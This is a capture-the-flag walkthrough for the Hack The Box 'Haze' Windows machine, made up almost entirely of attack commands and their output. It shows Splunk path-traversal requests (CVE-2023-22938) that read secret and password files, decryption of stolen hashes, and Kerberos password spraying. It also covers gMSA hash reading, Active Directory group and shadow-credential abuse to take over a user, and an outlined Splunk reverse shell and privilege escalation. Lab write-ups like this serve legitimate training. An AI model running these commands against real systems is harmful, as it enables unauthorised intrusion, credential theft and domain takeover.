# Haze Windows Hard Machine - Season 7

Go to Splunk running on port 8000 

Search for exploits in Splunk and you will find this [CVE-2023-22938](https://pentest-tools.com/vulnerabilities-exploits/splunk-enterprise-local-file-inclusion_22938 "https://pentest-tools.com/vulnerabilities-exploits/splunk-enterprise-local-file-inclusion_22938")

Go searching for important files in Splunk Project Tree like:

```bash
# User and Hashes for LDAP.
curl -s "http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/authentication.conf"

# Users and not crackable hashes
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/passwd'

# Private Key for splunk hashes
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret'

# More info
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/server.conf'
```

authentication.conf will give you a first and last name, the others file will give you three hashes. Use splunksecrets tool to decrypt them.

```bash

┬─[akame@starsfall:~/d/h/haze]─[0]
╰─>$ splunksecrets splunk-decrypt -S splunk.secret
Ciphertext: $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==
<pass>

┬─[akame@starsfall:~/d/h/haze]─[0]
╰─>$ splunksecrets splunk-decrypt -S splunk.secret
Ciphertext: $7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==
<pass>

┬─[akame@starsfall:~/d/h/haze]─[0]
╰─>$ splunksecrets splunk-decrypt -S splunk.secret
Ciphertext: $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
<pass>
```

Then you need to try a password spray using all passwords you could get in the user paul.taylor which you can guess from the authentication.conf.

```bash
# it will give one valid login
kerbrute passwordspray -d haze.htb --dc 10.10.11.61 users.txt 'pass'

# find more users
nxc smb 10.10.11.61 -u 'paul.taylor' -p 'pass' --rid-brute > users.txt

# try to use the existent passwords in the new users
kerbrute passwordspray -d haze.htb --dc 10.10.11.61 users.txt 'password'

# Use new user to gather info.
nxc ldap 10.10.11.61 -u 'mark.adams' -p 'password' --bloodhound --collection All

# Bloodhound will show you that you can read gmsa_hash from Haze-IT-Backup.
# Reading hash.
netexec ldap 10.10.11.61 -u mark.adams -p password --gmsa

# Rerunning bloodhound.
nxc ldap 10.10.11.61 -u 'Haze-IT-Backup$' -H 'hash' --bloodhound --collection All
```

The last piece information to get to root is that you can abuse the AddKeyCredetialLink (Warn: Should understand this technique more) privilege in the group support_services to get the credentials of the edward martin user.

```bash
┬─[akame@starsfall:~]─[1]
╰─>$ bloodyAD --host dc01.haze.htb -d "haze.htb" -u 'Haze-IT-Backup$' -p "hash" --dc-ip 10.10.11.61 add genericAll "SUPPORT_SERVICES" 'Haze-IT-Backup$'
[+] Haze-IT-Backup\$ has now GenericAll on SUPPORT_SERVICES
┬─[akame@starsfall:~]─[0]
╰─>$ bloodyAD --host dc01.haze.htb -d "haze.htb" -u 'Haze-IT-Backup$' -p "hash" --dc-ip 10.10.11.61 add groupMember "SUPPORT_SERVICES" 'Haze-IT-Backup$'
[+] Haze-IT-Backup\$ added to SUPPORT_SERVICES
┬─[akame@starsfall:~]─[0]
╰─>$ bloodyAD --host dc01.haze.htb -d "haze.htb" -u 'Haze-IT-Backup$' -p "hash" --dc-ip 10.10.11.61 add groupMember "SUPPORT_SERVICES" "edward.martin"
[+] edward.martin added to SUPPORT_SERVICES

# Start pywhisker (warning: should understand this part more).
┬─[akame@starsfall:~]─[0]
╰─>$ pywhisker -d haze.htb -u "Haze-IT-Backup$" -H "hash" -target "edward.martin" --action "add"

# Get TGT, if you received clock stew error fix it using ntpdate.
┬─[akame@starsfall:~]─[0]
╰─>$ gettgtpkinit.py -cert-pfx /home/kali/AD-Exploits/pywhisker/pywhisker/cTvVvE9P.pfc -pfx-pass 7aeuSlJi6YfT57ZJLb0T haze.htb/edward.martin edward.ccache

# Finally get the hash to let us login.
┬─[akame@starsfall:~]─[0]
╰─>$ getnthash.py -key (key from output above) haze.htb/edward.martin
```

Why not abuse the ForceChangePassword privilege?
```bash
## Example why ForceChangePassword abuse is not possible in this case.
┬─[akame@starsfall:~]─[0]
╰─>$ bloodyAD --host "dc01.haze.htb" -d "haze.htb" -u 'Haze-IT-Backup$' -p "hash" --dc-ip 10.10.11.61 set password "edward.martin" "Password123!"
Traceback (most recent call last):
  File "/home/akame/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/akame/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
  File "/home/akame/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py", line 241, in password
    raise e
  File "/home/akame/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/akame/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 301, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException:
Password can't be changed before -1 day, 7:58:44.850772 because of the minimum password age policy.
```

To get to the root is something like (i'm not remembering it well):

1. Download Backup file in the C:\
2. Find hash credentials for alexander.green
3. decrypt it using splunksecrets
4. login in splunk as admin
5. reverse shell using [this](https://github.com/0xjpuff/reverse_shell_splunk)
6. Abuse `SeImpersonatePrivilege` to get root

